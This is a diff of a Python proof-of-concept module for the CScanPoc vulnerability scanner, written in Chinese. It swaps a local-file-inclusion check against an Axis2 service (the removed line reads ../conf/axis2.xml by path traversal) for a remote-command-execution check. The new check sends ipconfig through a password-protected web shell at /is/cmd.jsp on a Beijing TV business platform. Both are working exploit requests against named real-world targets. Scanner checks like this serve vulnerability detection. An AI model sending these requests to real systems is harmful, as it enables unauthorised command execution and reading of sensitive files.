@@ -4,24 +4,24 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'Cncert_0000' # 平台漏洞编号
-    name = '政府信息公开统一平台存在本地文件包含' # 漏洞名称
+    vuln_id = 'Cncert_0008' # 平台漏洞编号
+    name = '北京电视台业务平台远程命令执行' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.LFI # 漏洞类型
-    disclosure_date = '2015-12-02'  # 漏洞公布时间
+    type = VulnType.RCE # 漏洞类型
+    disclosure_date = '2015-08-31'  # 漏洞公布时间
     desc = '''
-        政府信息公开统一平台存在本地文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
+        北京电视台业务平台远程命令执行漏洞，攻击者可以通过构造恶意语句来执行任意远程命令。
     ''' # 漏洞描述
-    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=146582
+    ref = 'Uknown' #https://wooyun.shuimugan.com/bug/view?bug_no=125497
     cnvd_id = 'Uknown' # cnvd漏洞编号
     cve_id = 'Uknown'  # cve编号
-    product = 'cncert国家互联网应急中心'  # 漏洞组件名称
+    product = '北京电视台'  # 漏洞组件名称
     product_version = 'Uknown'  # 漏洞应用版本
 
 class Poc(ABPoc):
-    poc_id = 'd51649cb-1218-401e-ab79-20e14d7aff19' # 平台 POC 编号
+    poc_id = '7ba7885a-1abe-45ca-ad08-8d679bec37c7' # 平台 POC 编号
     author = '国光'  # POC编写者
-    create_date = '2018-06-06' # POC创建时间
+    create_date = '2018-06-12' # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -31,9 +31,9 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            vul_url = arg + '/axis2/services/Version?xsd=../conf/axis2.xml'
+            vul_url = arg + '/is/cmd.jsp?pwd=023&cmd=ipconfig'
             response = requests.get(vul_url)
-            if response.status_code ==200 and 'xml version' in response.content:
+            if response.status_code ==200 and 'Windows IP' in response.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
 
         except Exception, e:
